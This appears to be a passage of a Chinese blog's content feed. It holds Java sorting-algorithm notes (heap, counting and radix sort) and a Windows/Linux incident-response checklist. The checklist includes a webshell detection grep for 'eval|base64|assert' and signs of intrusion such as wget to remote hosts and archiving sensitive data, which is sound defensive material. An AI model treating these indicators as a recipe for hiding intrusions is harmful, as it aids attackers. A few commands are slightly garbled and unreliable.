class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>堆排序即从头开始，heapsize=0，使0-0为大根堆，0-1为大根堆，直至0-arr.length-1为大根堆，此时heapsize=arr.length，然后将大根堆最大值即arr[0]与最后一个数交换，然后heapsize–，同时做<code>heapify</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">heapSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">heapInsert</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> heapSize <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>heapSize <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token operator">--</span>heapSize<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">heapify</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> heapSize<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="小根堆的应用"><a href="#小根堆的应用" class="headerlink" title="小根堆的应用"></a>小根堆的应用</h2><p>已知一个几乎有序的数组，几乎有序是指，如果把数组排好顺序的话，每个元素移动的距离可以不超过k，并且k相对于数组来说比较小。请选择一个合适的排序算法针对这个数据进行排序</p><p>0, 1, 2, …, i, i+1, …, length-1</p><p>先取前k+1个数，0, 1, …, k，将这些数变为小根堆，那么0位置上的数一定为整个数组的最小值，因为移动距离不超过k，所以将该小根堆最小值放在第0位置即可，然后将k+1加入小根堆，弹出该小根堆最小值，放在第1位置，依次往后，到最后k+1个数，一一弹出即可</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">smallRootHeap</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> heap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> heap<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        heap<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        arr<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> heap<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>heap<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> arr<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> heap<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="桶排序"><a href="#桶排序" class="headerlink" title="桶排序"></a>桶排序</h2><p>不基于比较的排序，需要样本数据状况满足桶的划分，时间复杂度O(n)</p><h3 id="计数排序"><a href="#计数排序" class="headerlink" title="计数排序"></a>计数排序</h3><p>对一个值在0-200内的整数数组进行排序，设立辅助数组（size为该数组的最大值），然后遍历数组，值即为辅助数组下标，使其++，所以辅助数组相当于计数器，遍历完之后，从小到大输出</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">countSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> max <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span>MIN_VALUE<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> each<span class="token operator">:</span>arr<span class="token punctuation">)</span> <span class="token keyword">if</span><span class="token punctuation">(</span>max <span class="token operator">&lt;</span> each<span class="token punctuation">)</span> max <span class="token operator">=</span> each<span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bucket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>max<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> each<span class="token operator">:</span>arr<span class="token punctuation">)</span> bucket<span class="token punctuation">[</span>each<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>bucket<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">--</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> arr<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> j<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h3><p>该排序只适用于有进制的数据，即十进制用十个桶，三进制用3个桶等</p><p>对于十进制数据，准备size为10的辅助数组，然后遍历待排序的数组，从个位开始，个位为1的放到辅助数组[1]中，依次遍历，然后再取出，这十个桶需要满足队列性质，即先进的先出，然后再对十位，百位进行同样的入桶出桶操作，最后出来的即为有序</p><p><strong>优化版的算法</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">radixSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> digit <span class="token operator">=</span> <span class="token function">maxDigit</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">radixSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> arr<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> digit<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">maxDigit</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> max <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span>MIN_VALUE<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> each<span class="token operator">:</span>arr<span class="token punctuation">)</span> <span class="token keyword">if</span><span class="token punctuation">(</span>max <span class="token operator">&lt;</span> each<span class="token punctuation">)</span> max <span class="token operator">=</span> each<span class="token punctuation">;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>max<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        res<span class="token operator">++</span><span class="token punctuation">;</span>        max <span class="token operator">/=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">radixSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> <span class="token keyword">int</span> digit<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">final</span> <span class="token keyword">int</span> radix <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bucket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>r<span class="token operator">-</span>l<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> d<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>d<span class="token operator">&lt;=</span>digit<span class="token punctuation">;</span>d<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> count <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>radix<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>l<span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>r<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token function">getDigit</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span>            count<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>count<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> count<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> count<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>r<span class="token punctuation">;</span>i<span class="token operator">>=</span>l<span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token function">getDigit</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span>            bucket<span class="token punctuation">[</span><span class="token operator">--</span>count<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>l<span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>r<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">getDigit</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">int</span> digit<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>num<span class="token operator">/</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span>digit<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 左程云 </tag>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急排查</title>
      <link href="/2021/09/26/%E5%BA%94%E6%80%A5%E6%8E%92%E6%9F%A5/"/>
      <url>/2021/09/26/%E5%BA%94%E6%80%A5%E6%8E%92%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<p>windows &amp; linux 应急知识体系</p><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="三要素"><a href="#三要素" class="headerlink" title="三要素"></a>三要素</h3><p>时间 - 发生时间、恶意文件时间</p><p>地点 - 文件目录</p><p>事件 - 系统日志、web日志、历史记录</p><h3 id="尝试分析、溯源、模拟攻击"><a href="#尝试分析、溯源、模拟攻击" class="headerlink" title="尝试分析、溯源、模拟攻击"></a>尝试分析、溯源、模拟攻击</h3><h3 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h3><p>常见目录 - <code>/tmp, /var/tmp, /dev/shm, RECYCLER</code></p><p>手法 - 一句话木马、后门</p><p>恶意软件特征</p><h3 id="排查方式"><a href="#排查方式" class="headerlink" title="排查方式"></a>排查方式</h3><blockquote><p>事件类型  -  时间范围  -  文件排除  -  进程排除  -  系统信息 -  日志分析  -  入侵方式  -  解决办法</p></blockquote><h2 id="windows应急"><a href="#windows应急" class="headerlink" title="windows应急"></a>windows应急</h2><h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><p>基本信息 - msinfo32, systeminfo</p><p>用户 - net user（无法查看隐藏用户）</p><p>启动项 - msconfig, 注册表</p><p>计划任务 - compmgmt.msc, schtasks</p><h3 id="文件排查"><a href="#文件排查" class="headerlink" title="文件排查"></a>文件排查</h3><p>敏感目录， 后门文件</p><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>tasklist, netstat, powershell, wmic, 任务管理器</p><h3 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h3><p>eventvwr</p><h2 id="linux应急"><a href="#linux应急" class="headerlink" title="linux应急"></a>linux应急</h2><h3 id="系统信息-1"><a href="#系统信息-1" class="headerlink" title="系统信息"></a>系统信息</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">uname</span> -a<span class="token function">cat</span> /proc/versionlsmod<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">useradd</span> userdel的命令时间变化，是否包含可疑信息<span class="token function">cat</span> /etc/passwd<span class="token environment constant">UID</span>为0登录用户 /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">history</span><span class="token function">cat</span> /root/.bash_history<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>通过查看命令操作痕迹，可能关联到如下信息：</p><p><code>wget</code>远程某主机</p><p>尝试连接内网某主机<code>ssh scp</code> 便于分析攻击者意图</p><p>打包某敏感数据或代码， <code>tar zip</code>类命令</p><p>对系统进行配置，包括命令修改、远控木马类</p></blockquote><h3 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">/etc/init.d/rc.local/etc/rc.local/etc/init.d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">crontab</span> -l <span class="token comment">#列出计划任务</span><span class="token function">crontab</span> -e <span class="token comment">#编辑计划任务</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="进程-1"><a href="#进程-1" class="headerlink" title="进程"></a>进程</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">netstat</span> -ltunp <span class="token comment">#找出可疑PID</span><span class="token function">ls</span> -alh /proc/pid<span class="token function">lsof</span> -p pid<span class="token function">ps</span> -ef <span class="token operator">|</span> <span class="token function">grep</span> xxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="时间点"><a href="#时间点" class="headerlink" title="时间点"></a>时间点</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">find</span> -mtime -n +n file-modify-time -n within-n-days +n before-n-days-atime -n +n file-access-time -n within-n-days +n before-n-days-ctime -n +n file-create-time -n within-n-days +n before-n-days<span class="token comment">#找出新增的文件</span><span class="token function">find</span> / -ctime <span class="token number">0</span> -name <span class="token string">".sh"</span><span class="token comment">#find webshell</span><span class="token function">find</span> /var/www/ -name <span class="token string">"*.php"</span> <span class="token operator">|</span> xray <span class="token function">egrep</span> <span class="token string">"eval|base64|assert"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">1</span><span class="token punctuation">)</span>/var/log/secure <span class="token comment">#记录登录系统存取数据的文件;</span><span class="token comment">#例如:pop3，ssh，telnet，ftp等都会记录在此.</span><span class="token number">2</span><span class="token punctuation">)</span>/ar/log/btmp <span class="token comment">#记录登录的信息记录，被编码过，所以必须以last解析;</span>lastb <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123; print $3&#125;'</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span> -c <span class="token operator">|</span> <span class="token function">sort</span> -nr <span class="token operator">|</span> <span class="token function">more</span><span class="token number">3</span><span class="token punctuation">)</span>/var/log/message <span class="token comment">#几乎所有的开机系统发生的错误都会在此记录;</span><span class="token number">4</span><span class="token punctuation">)</span>/var/log.boot.log <span class="token comment">#记录一些开机或者关机启动的一些服务显示的启动或者关闭的信息;</span><span class="token number">5</span><span class="token punctuation">)</span>/var/log/maillog <span class="token comment">#记录邮件的存取和往来;</span><span class="token number">6</span><span class="token punctuation">)</span>/var/log/cron <span class="token comment">#用来记录crontab这个服务的内容;</span><span class="token number">7</span><span class="token punctuation">)</span>/var/log/httpd, /var/log/mysqld.log 等等文件 <span class="token comment">#记录几个不同的网络服务的记录文件;</span><span class="token number">8</span><span class="token punctuation">)</span>/var/log/acpid <span class="token comment">#ACPI - Advanced Configuration and Power Interface，表示高级配置和电源管理接口,后面的 d 表示 deamon, acpid 也就是 the ACPI event daemon,也就是 acpi 的消息进程,用来控制、获取、管理 acpi 的状态的服务程序。</span><span class="token number">9</span><span class="token punctuation">)</span>/var/run/utmp <span class="token comment">#记录着现在登录的用户;</span><span class="token number">10</span><span class="token punctuation">)</span>/var/log/lastlog <span class="token comment">#记录每个用户最后的登录信息;</span><span class="token number">11</span><span class="token punctuation">)</span>/var/log/btmp <span class="token comment">#记录错误的登录尝试;</span><span class="token number">12</span><span class="token punctuation">)</span>/var/log/dmesg <span class="token comment">#内核日志;</span><span class="token number">13</span><span class="token punctuation">)</span>/var/log/cpus <span class="token comment">#CPU的处理信息；</span><span class="token number">14</span><span class="token punctuation">)</span>/var/log/syslog <span class="token comment">#事件记录监控程序日志；</span><span class="token number">15</span><span class="token punctuation">)</span>/var/log/auth.log <span class="token comment">#用户认证日志；</span><span class="token number">16</span><span class="token punctuation">)</span>/var/log/daemon.log <span class="token comment">#系统进程日志；</span><span class="token number">17</span><span class="token punctuation">)</span>/var/log/mail.err <span class="token comment">#邮件错误信息；</span><span class="token number">18</span><span class="token punctuation">)</span>/var/log/mail.info <span class="token comment">#邮件信息；</span><span class="token number">19</span><span class="token punctuation">)</span>/var/log/mail.warn <span class="token comment">#邮件警告信息；</span><span class="token number">20</span><span class="token punctuation">)</span>/var/log/daemon.log <span class="token comment">#系统监控程序产生的信息;</span><span class="token number">21</span><span class="token punctuation">)</span>/var/log/kern <span class="token comment">#内核产生的信息;</span><span class="token number">22</span><span class="token punctuation">)</span>/var/log/lpr <span class="token comment">#行打印机假脱机系统产生的信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="内存分析"><a href="#内存分析" class="headerlink" title="内存分析"></a>内存分析</h3><ol><li>基于用户模式程序的内存获取 </li><li>基于内核模式程序的内存获取 </li><li>基于系统崩溃转储的内存获取 </li><li>基于操作系统注入的内存获取 </li><li>基于系统休眠文件的内存获取 </li><li>基于虚拟化快照的内存获取 </li><li>基于系统冷启动的内存获取 </li><li>基于硬件的内存获取</li></ol><h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h2><h3 id="SysinternalsSuite"><a href="#SysinternalsSuite" class="headerlink" title="SysinternalsSuite"></a>SysinternalsSuite</h3><p>工具的集合，里面的工具可以管理、故障分析和诊断你的 Windows系统和应用程序。你能想到的相关排查问题的功能，里面都涵盖了，里面的工具 太多，没有办法一一介绍，如使用AD Explorer轻松导航AD数据库，定义收藏位置，查看 对象属性和属性，而无需打开对话框，编辑权限，查看对象的架构，以及执行可以保存和重 新执行的复杂搜索；使用TCPView查看网络连接情况 ；使用PsExec在远程系统上启动交互 式命令提示和IpConfig等远程启用工具；使用Autoruns对进程，服务，启动项等进行检测；使用procdump对内存进行dump等等。更多工具功能可以在下面网址去查询相关的功能及 使用方法。<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite</a></p><h3 id="PCHunter"><a href="#PCHunter" class="headerlink" title="PCHunter"></a>PCHunter</h3><p>是一款强大的内核级监控软件，软件可以查看内核文件、驱动模块、隐藏进程、注册表, 内核，网络等等信息，和PCHunter功能相似的还有火绒剑，PowerTool等。具体的功能有下图所示 数字签名颜色说明：黑色：微软签名的驱动程序；蓝色：非微软签名的驱动程序；红色：驱动检测到的可疑对象，隐藏服务、进程、被挂钩函数；</p><h3 id="Process-monitor"><a href="#Process-monitor" class="headerlink" title="Process monitor"></a>Process monitor</h3><p>主要是监控进程的行为应用程序运行时使用此软件来监控程序的各种操作。此软 件主要监控程序的五种行为：文件系统，注册表，进程，网络，分析。由于此款软件监控的是系统中 所有的进程的行为，数据量往往很大，不利于我们分析数据，所以需要对其设置过滤选项，通过Filter- &gt;Filter选项可以看到右侧的窗口，在此窗口中增加过滤项。</p><h3 id="Event-Log-Explorer"><a href="#Event-Log-Explorer" class="headerlink" title="Event Log Explorer"></a>Event Log Explorer</h3><p>是一款检测系统安全的软件。查看，监视和分析跟事件记录，包括安全，系统，应 用程序和其他微软Windows 的记录被记载的事件。</p><h3 id="FullEventLogView"><a href="#FullEventLogView" class="headerlink" title="FullEventLogView"></a>FullEventLogView</h3><p>是一个轻量级的日志检索工具，特点是绿色版，免安装，同时检索功能比 windows自带的检索工具要快，展示要好。功能大家在用的时候探索一下就好，比较简单。</p><h3 id="Log-Parser"><a href="#Log-Parser" class="headerlink" title="Log Parser"></a>Log Parser</h3><p>是微软工程师写的一个日志分析工具，功能很强大，支持SQL 查询语法的 日志查询工具。</p><h2 id="勒索病毒及解密工具查询网站"><a href="#勒索病毒及解密工具查询网站" class="headerlink" title="勒索病毒及解密工具查询网站"></a>勒索病毒及解密工具查询网站</h2><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">https:</span>//lesuobingdu.qianxin.com/ <span class="token header-name keyword">http:</span>//lesuobingdu.360.cn/ <span class="token header-name keyword">https:</span>//guanjia.qq.com/pr/ls/#navi_0 <span class="token header-name keyword">https:</span>//id-ransomware.malwarehunterteam.com/ <span class="token header-name keyword">https:</span>//www.nomoreransom.org/zh/index.html <span class="token header-name keyword">https:</span>//esupport.trendmicro.com/en-us/home/pages/technical-support/1114221.aspx <span class="token header-name keyword">https:</span>//noransom.kaspersky.com/ <span class="token header-name 